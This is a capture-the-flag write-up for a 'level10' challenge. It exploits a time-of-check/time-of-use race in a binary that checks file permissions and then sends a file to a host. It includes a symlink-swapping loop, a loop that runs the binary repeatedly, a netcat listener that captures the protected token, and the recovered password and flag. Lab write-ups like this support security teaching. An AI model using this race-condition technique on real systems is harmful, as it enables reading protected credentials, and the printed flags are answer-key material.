##### 1 - Analyze binary and behavior
``./level10``
>./level10 file host
>	sends file to host if you have access to it

``./level10 token 10.11.1.3``
>You don't have access to token

Binary is checking access rights before opening file and sending it to host

----

##### 2 - Exploit race condition
Du to timing between checking permission and opening file, we will try to exploit race condition
With many attempts we gonna try to make a symbolic link on the file we have right on and swap this
symbolic link with one who goes to the token file

``while true; do ln -fs ~/level10 /tmp/aaa; ln -fs ~/token /tmp/aaa; done``

In a new SSH terminal :
``./level10 /tmp/aaa x``
>You don't have access to /tmp/aaa
``./level10 /tmp/aaa x``
>You don't have access to /tmp/aaa
``./level10 /tmp/aaa x``
>Connecting to 10.11.1.s:6969 .. Unable to connect to host x

Seems like it could work, let's try to automate it, in a infinite while.

``while true; do ~/level10 /tmp/aaa 10.11.1.3; done``

----

##### 3 - Open a server and wait for connection

In a new local terminal :
``while true; do nc -l -p 6969; done``

>USELESS STUFF
>(.*( )*.
>woupa2yuojeeaaed06riuj63c
>.*( )*.
>USELESS STUFF

-----

##### 4 - Getting the flag
``su flag10``
``password: woupa2yuojeeaaed06riuj63c``

``getflag``
>Check flag.Here is your token : **feulo4b72j7edeahuete3no7c**
